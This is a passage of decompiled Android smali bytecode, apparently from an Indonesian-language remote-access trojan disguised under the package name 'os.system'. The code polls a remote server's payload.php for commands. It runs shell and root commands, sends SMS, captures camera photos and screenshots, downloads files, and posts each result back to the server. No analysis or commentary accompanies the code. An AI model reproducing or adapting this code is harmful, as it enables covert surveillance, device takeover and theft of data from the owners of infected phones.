    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_16
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_16} :catch_e

    .line 510
    :goto_16
    :try_start_17
    sget-object v2, Los/system/System;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-_-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    iput-object v2, v0, Los/system/System;->term:[Ljava/lang/String;

    .line 511
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/System;->term:[Ljava/lang/String;

    const/4 v3, 0x1

    aget-object v2, v2, v3

    const-string v3, ""

    if-eq v2, v3, :cond_15

    .line 512
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, ""

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/System;->term:[Ljava/lang/String;

    const/4 v5, 0x1

    aget-object v4, v4, v5

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Los/system/ReceiverBoot;->shellCommands(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 513
    sget-object v3, Los/system/System;->TAG:Ljava/lang/String;

    invoke-static {v3, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 515
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v4, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/payload.php?outpayload="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_d

    .line 521
    :cond_15
    :goto_17
    :try_start_18
    sget-object v2, Los/system/System;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-su-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    iput-object v2, v0, Los/system/System;->term:[Ljava/lang/String;

    .line 522
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/System;->term:[Ljava/lang/String;

    const/4 v3, 0x1

    aget-object v2, v2, v3

    const-string v3, ""

    if-eq v2, v3, :cond_16

    .line 523
    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/System;->term:[Ljava/lang/String;

    const/4 v5, 0x1

    aget-object v4, v4, v5

    aput-object v4, v2, v3

    .line 524
    const-string v3, ""
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_c

    .line 526
    :try_start_19
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    invoke-virtual {v3, v2}, Los/system/ReceiverBoot;->rootCommands([Ljava/lang/String;)V

    .line 527
    const-string v2, "sukses execute root"
    :try_end_19
    .catch Ljava/lang/Exception; {:try_start_19 .. :try_end_19} :catch_b

    .line 531
    :goto_18
    :try_start_1a
    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 532
    sget-object v3, Los/system/System;->TAG:Ljava/lang/String;

    invoke-static {v3, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 534
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v4, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/payload.php?outpayload="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1a
    .catch Ljava/lang/Exception; {:try_start_1a .. :try_end_1a} :catch_c

    .line 538
    :cond_16
    :goto_19
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?inpayload=null"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p0

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 540
    :cond_17
    return-void

    .line 285
    :cond_18
    :try_start_1b
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "sms kosong"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 286
    sget-object v2, Los/system/System;->TAG:Ljava/lang/String;

    const-string v3, "kosong"

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_7

    .line 301
    :catch_3
    move-exception v2

    goto/16 :goto_7

    .line 290
    :cond_19
    const-string v3, ""
    :try_end_1b
    .catch Ljava/lang/Exception; {:try_start_1b .. :try_end_1b} :catch_3

    .line 292
    :try_start_1c
    new-instance v4, Los/system/MainActivity;

    invoke-direct {v4}, Los/system/MainActivity;-><init>()V

    const/4 v4, 0x2

    aget-object v4, v2, v4

    const/4 v5, 0x1

    aget-object v2, v2, v5

    move-object/from16 v0, p1

    invoke-static {v0, v4, v2}, Los/system/MainActivity;->sendSMS(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    :try_end_1c
    .catch Ljava/lang/Exception; {:try_start_1c .. :try_end_1c} :catch_4

    move-result-object v2

    .line 296
    :goto_1a
    :try_start_1d
    sget-object v3, Los/system/System;->TAG:Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "sms:"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 299
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v4, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/payload.php?outpayload="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_7

    .line 293
    :catch_4
    move-exception v2

    .line 294
    sget-object v4, Los/system/System;->TAG:Ljava/lang/String;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "smserr:"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v4, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1d
    .catch Ljava/lang/Exception; {:try_start_1d .. :try_end_1d} :catch_3

    move-object v2, v3

    goto :goto_1a

    .line 364
    :cond_1a
    const/4 v3, 0x1

    :try_start_1e
    aget-object v2, v2, v3

    const-string v3, "back"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_12

    .line 365
    const/4 v2, 0x0

    sput v2, Los/system/CamRuntime;->isCamera:I

    .line 366
    new-instance v2, Landroid/content/Intent;

    const-class v3, Los/system/CamRuntime;

    move-object/from16 v0, p1

    invoke-direct {v2, v0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 367
    move-object/from16 v0, p1

    invoke-virtual {v0, v2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 369
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->camServiceConeksi:Landroid/content/ServiceConnection;

    const/4 v4, 0x0

    move-object/from16 v0, p0

    invoke-virtual {v0, v2, v3, v4}, Los/system/System;->bindService(Landroid/content/Intent;Landroid/content/ServiceConnection;I)Z
    :try_end_1e
    .catch Ljava/lang/Exception; {:try_start_1e .. :try_end_1e} :catch_5

    goto/16 :goto_b

    .line 373
    :catch_5
    move-exception v2

    goto/16 :goto_c

    .line 383
    :cond_1b
    :try_start_1f
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "gagal buka apk"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1f
    .catch Ljava/lang/Exception; {:try_start_1f .. :try_end_1f} :catch_6

    goto/16 :goto_d

    .line 388
    :catch_6
    move-exception v2

    goto/16 :goto_d

    .line 399
    :cond_1c
    const/4 v3, 0x1

    :try_start_20
    aget-object v3, v2, v3

    const-string v4, "screen"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1d

    .line 400
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/screen.jpg"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 402
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v4, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/payload.php?outpayload="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "upload screenshot TUNGGU"

    move-object/from16 v0, p0

    invoke-virtual {v0, v4}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v4, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p0

    invoke-virtual {v0, v1, v3, v4}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_e

    .line 421
    :catch_7
    move-exception v2

    goto/16 :goto_f

    .line 404
    :cond_1d
    const/4 v3, 0x1

    aget-object v3, v2, v3

    const-string v4, "foto"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1e

    .line 405
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/foto.jpg"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 407
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v4, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/payload.php?outpayload="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "upload foto TUNGGU"

    move-object/from16 v0, p0

    invoke-virtual {v0, v4}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v4, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p0

    invoke-virtual {v0, v1, v3, v4}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_e

    .line 410
    :cond_1e
    const/4 v3, 0x1

    aget-object v2, v2, v3
    :try_end_20
    .catch Ljava/lang/Exception; {:try_start_20 .. :try_end_20} :catch_7

    goto/16 :goto_e

    .line 430
    :catch_8
    move-exception v2

    .line 431
    const/4 v2, 0x1

    :try_start_21
    aget-object v2, v4, v2

    .line 432
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v5, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v5, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "/download.php?id="

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const/4 v5, 0x1

    aget-object v5, v4, v5

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_21
    .catch Ljava/lang/Exception; {:try_start_21 .. :try_end_21} :catch_10

    move-result-object v3

    goto/16 :goto_10

    .line 453
    :cond_1f
    const/4 v2, 0x3

    :try_start_22
    aget-object v2, v8, v2

    const-string v3, "tengah"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_20

    const/16 v2, 0x11

    sput v2, Los/system/System;->alert_letak:I
    :try_end_22
    .catch Ljava/lang/Exception; {:try_start_22 .. :try_end_22} :catch_9

    goto/16 :goto_13

    .line 481
    :catch_9
    move-exception v2

    .line 484
    :try_start_23
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "toast text:"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const/4 v4, 0x1

    aget-object v4, v8, v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 486
    new-instance v10, Los/system/System$5;

    const-wide/16 v12, 0x1d4c

    const-wide/16 v14, 0x64

    move-object/from16 v11, p0

    move-object/from16 v16, p1

    move-object/from16 v17, v8

    invoke-direct/range {v10 .. v17}, Los/system/System$5;-><init>(Los/system/System;JJLandroid/content/Context;[Ljava/lang/String;)V

    .line 494
    invoke-virtual {v10}, Los/system/System$5;->start()Landroid/os/CountDownTimer;
    :try_end_23
    .catch Ljava/lang/Exception; {:try_start_23 .. :try_end_23} :catch_a

    goto/16 :goto_15

    .line 497
    :catch_a
    move-exception v2

    goto/16 :goto_15

    .line 454
    :cond_20
    const/4 v2, 0x3

    :try_start_24
    aget-object v2, v8, v2

    const-string v3, "bawah"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_21

    const/16 v2, 0x50

    sput v2, Los/system/System;->alert_letak:I

    goto/16 :goto_13

    .line 455
    :cond_21
    const/4 v2, 0x3

    aget-object v2, v8, v2

    const-string v3, "atas&tengah"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_22

    const/16 v2, 0x31

    sput v2, Los/system/System;->alert_letak:I

    goto/16 :goto_13

    .line 456
    :cond_22
    const/4 v2, 0x3

    aget-object v2, v8, v2

    const-string v3, "bawah&tengah"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_13

    const/16 v2, 0x51

    sput v2, Los/system/System;->alert_letak:I

    goto/16 :goto_13

    .line 459
    :cond_23
    const/4 v2, 0x2

    aget-object v2, v8, v2

    const-string v3, "merah"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_24

    const/high16 v2, -0x10000

    sput v2, Los/system/System;->alert_warna:I

    goto/16 :goto_14

    .line 460
    :cond_24
    const/4 v2, 0x2

    aget-object v2, v8, v2

    const-string v3, "kuning"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_25

    const/16 v2, -0x100

    sput v2, Los/system/System;->alert_warna:I

    goto/16 :goto_14

    .line 461
    :cond_25
    const/4 v2, 0x2

    aget-object v2, v8, v2

    const-string v3, "hujau"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_14

    const v2, -0xff0100

    sput v2, Los/system/System;->alert_warna:I
    :try_end_24
    .catch Ljava/lang/Exception; {:try_start_24 .. :try_end_24} :catch_9

    goto/16 :goto_14

    .line 528
    :catch_b
    move-exception v2

    .line 529
    :try_start_25
    const-string v2, "Failed execute root"
    :try_end_25
    .catch Ljava/lang/Exception; {:try_start_25 .. :try_end_25} :catch_c

    goto/16 :goto_18

    .line 537
    :catch_c
    move-exception v2

    goto/16 :goto_19

    .line 518
    :catch_d
    move-exception v2

    goto/16 :goto_17

    .line 507
    :catch_e
    move-exception v2

    goto/16 :goto_16

    .line 450
    :catch_f
    move-exception v2

    goto/16 :goto_12

    .line 444
    :catch_10
    move-exception v2

    goto/16 :goto_11

    .line 356
    :catch_11
    move-exception v3

    goto/16 :goto_a

    .line 352
    :catch_12
    move-exception v3

    goto/16 :goto_9

    .line 338
    :catch_13
    move-exception v2

    goto/16 :goto_8

    .line 262
    :catch_14
    move-exception v2

    goto/16 :goto_5

    .line 238
    :catch_15
    move-exception v2

    goto/16 :goto_3
.end method

.method public reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 5

    .prologue
    const/4 v4, 0x0

    .line 566
    new-instance v0, Los/system/System$PayloadWebTask;

    const/4 v1, 0x0

    invoke-direct {v0, p0, v1}, Los/system/System$PayloadWebTask;-><init>(Los/system/System;Los/system/System$1;)V

    .line 567
    iput-object p1, v0, Los/system/System$PayloadWebTask;->applicationContext:Landroid/content/Context;

    .line 568
    iput-object p3, v0, Los/system/System$PayloadWebTask;->paymain:Ljava/lang/String;

    .line 570
    const-string v1, "text"

    invoke-virtual {p3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    sget-object v1, Los/system/System;->TAG:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "...payload text   : "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-object v3, Los/system/System;->payloadWebResult:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 575
    :cond_0
    :goto_0
    :try_start_0
    iget-object v1, p0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    invoke-static {p1}, Los/system/ReceiverBoot;->cekConnection(Landroid/content/Context;)Z

    move-result v1

    if-eqz v1, :cond_3

    .line 576
    const-wide/16 v2, 0x320

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    .line 577
    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/String;

    const/4 v2, 0x0

    aput-object p2, v1, v2

    invoke-virtual {v0, v1}, Los/system/System$PayloadWebTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 585
    :goto_1
    return-void

    .line 571
    :cond_1
    const-string v1, "sw"

    invoke-virtual {p3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2

    sget-object v1, Los/system/System;->TAG:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "...payload sw     : "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-object v3, Los/system/System;->payloadWebResultSwitch:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

